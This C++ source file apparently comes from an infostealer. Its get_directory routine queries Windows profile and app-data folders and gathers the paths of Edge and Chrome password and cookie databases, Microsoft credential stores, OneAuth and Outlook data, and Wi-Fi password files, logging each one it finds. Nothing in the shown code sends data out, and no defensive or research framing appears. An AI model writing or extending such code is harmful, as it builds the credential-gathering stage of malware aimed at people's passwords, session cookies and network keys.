#include "get-directory.h"
#include <cstring>
#include <windows.h>
#include <shlobj.h>

namespace fs = std::filesystem;
namespace fp {
    void dir::add_paths(fs::path addpath) {
        dir::pVec.push_back(addpath);
    }

    void dir::get_directory() {
        TCHAR path[MAX_PATH];
        TCHAR newpath[MAX_PATH];
        struct _stat sbuffer;
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))) {
            fs::path fullpath = fs::path(path) / COOKIES;
            if(check_path(fullpath)){
                add_paths(fullpath);
            }
        }
        else {
            std::cerr << "Failed to get profile.\n";
        }

        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            std::vector<std::string> arr = {M_CRED, PASSWORD_EDGE, COOKIE_EDGE, ONE_AUTH, OUTLOOK_EMAIL, PASSWORD_CHROME, COOKIE_CHROME};
            for (int i = 0; i < 7; ++i) {
                fs::path fullpath = fs::path(path) / arr[i];
                if(check_path(fullpath)){
                    add_paths(fullpath);
                }
            }
        }
        else {
            std::cerr << "Failed to get local app data path.\n";
        }

        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))){
            fs::path fullpath = fs::path(path) / PASSWORD_WIFI;
            if(check_path(fullpath)){
                add_paths(fullpath);
            }
        }
        else {
            std::cerr << "Failed to get program data path.\n";
        }
        
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path))) {
            fs::path fullpath = fs::path(path) / PASSWORD_WIFI;
            if(check_path(fullpath)){
                add_paths(fullpath);
            }
        }
        else {
            std::cerr << "Failed to get roaming app data path.\n";
        }
    }
    bool check_path(fs::path cpath) {
        if (fs::exists(cpath)) {
            std::cout << "Valid Path: " << cpath << std::endl;
            return true;
        }
        else {
            std::cout << "Invalid Path: " << cpath << std::endl;
            return false;
        }
    }
}